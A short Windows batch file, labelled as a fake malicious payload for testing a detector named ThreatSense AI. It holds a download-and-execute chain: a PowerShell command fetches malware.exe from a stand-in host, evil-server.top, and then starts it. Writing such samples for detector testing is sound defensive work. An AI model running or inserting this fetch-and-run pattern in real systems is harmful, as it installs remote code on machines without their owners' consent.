@echo off
REM Fake malicious payload for testing ThreatSense AI
echo "Downloading payload..."
powershell -Command "Invoke-WebRequest -Uri 'http://evil-server.top/malware.exe' -OutFile 'C:\temp\malware.exe'"
start C:\temp\malware.exe
